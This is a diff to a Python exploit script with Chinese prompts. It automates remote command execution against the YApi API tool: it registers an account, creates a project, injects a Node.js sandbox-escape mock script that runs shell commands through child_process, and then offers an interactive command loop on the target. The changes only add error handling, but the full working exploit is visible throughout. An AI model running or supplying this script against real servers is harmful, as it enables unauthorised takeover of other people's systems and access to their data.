@@ -6,11 +6,15 @@ import os
 import sys
 import base64
 import click
+import urllib3
+urllib3.disable_warnings()
 
 @click.command()
 @click.option('--target', prompt="输入你的攻击目标", help='目标URL')
 def main(target):
     url = target
+    if url[-1] == "/":
+        url = url[:-1]
     cmd = "id"
     id = ''.join(random.sample(string.ascii_letters + string.digits, 8))
     defaultpayload = "const sandbox = this\nconst ObjectConstructor = this.constructor\nconst FunctionConstructor = ObjectConstructor.constructor\nconst Buffer =  new FunctionConstructor('return Buffer')()\nconst process = new FunctionConstructor('return process')()\ncmd  = new Buffer('d2hvYW1p','base64').toString()\n\nmockJson = new Buffer(process.mainModule.require(\"child_process\").execSync(cmd).toString()).toString('base64')"
@@ -29,27 +33,34 @@ def main(target):
         if(reg.json()['errcode']==0):
             print("注册成功")
         else:
-            exit("注册失败")
+            print("注册失败")
+            exit()
         login = requests.post(url+"/api/user/login",headers=header,verify=False,timeout=5,data=json.dumps(data))
         print(login.json())
         if(login.json()['errcode']==0):
             print("登录成功")
         else:
-            exit("登陆失败")
+            print("登陆失败")
+            exit()
         header['Cookie'] = login.headers['Set-Cookie'].split(";")[0]+"; _yapi_uid="+str(login.json()['data']['uid'])
         #print(requests.post(url+"/api/user/reg",headers=header,verify=False,timeout=5,data=json.dumps(data)).json())
         try:
             group_id = requests.get(url+"/api/group/list",headers=header,verify=False,timeout=5).json()['data'][0]['_id']
         except:
-            exit("获取用户信息失败")
+            print("获取用户组信息失败")
+            exit()
         #print("当前用户组")
         #print(group_id)
         data = {
             "name":id,"group_id":group_id,"icon":"code-o","color":"pink","project_type":"private"
         }
-        projid = requests.post(url+"/api/project/add",headers=header,verify=False,timeout=5,data=json.dumps(data)).json()['data']['_id']
+        try:
+            projid = requests.post(url+"/api/project/add",headers=header,verify=False,timeout=5,data=json.dumps(data)).json()['data']['_id']
         #print("当前项目")
         #print(projid)
+        except:
+            print("获取当前项目信息失败")
+            exit()
         payload = defaultpayload.replace("d2hvYW1p", base64.b64encode(cmd.encode()).decode())
         data = {
             "id":projid,"project_mock_script":payload,"is_mock_open":True
@@ -65,7 +76,13 @@ def main(target):
         print("cmd:")
         print(cmd)
         print("out:")
-        print(base64.b64decode(requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,verify=False,timeout=5).text).decode().strip())
+        try:
+            out = requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,verify=False,timeout=5).text
+            print(base64.b64decode(out.encode()).decode().strip())
+        except:
+            print("命令执行失败")
+            print(out)
+            exit()
         while True:
             cmd = input("cmd:\n")
             payload = defaultpayload.replace("d2hvYW1p", base64.b64encode(cmd.encode()).decode())
@@ -73,14 +90,14 @@ def main(target):
                 "id":projid,"project_mock_script":payload,"is_mock_open":True
             }
             up = requests.post(url+"/api/project/up",headers=header,verify=False,timeout=5,data=json.dumps(data)).json()
-            out = requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,verify=False,timeout=5).text.encode()
+            out = requests.get(url+"/mock/"+str(projid)+"/"+id,headers=header,verify=False,timeout=5)
             print("out:")
             try:
-                print(base64.b64decode(out).decode().strip())
+                print(base64.b64decode(out.text.encode()).decode().strip())
             except:
                 pass
-                print("或者命令执行失败")
-                print(out)
+                print("命令执行失败")
+                print(out.json())
     except:
         # print("Unexpected error:", sys.exc_info()[0])
         # raise
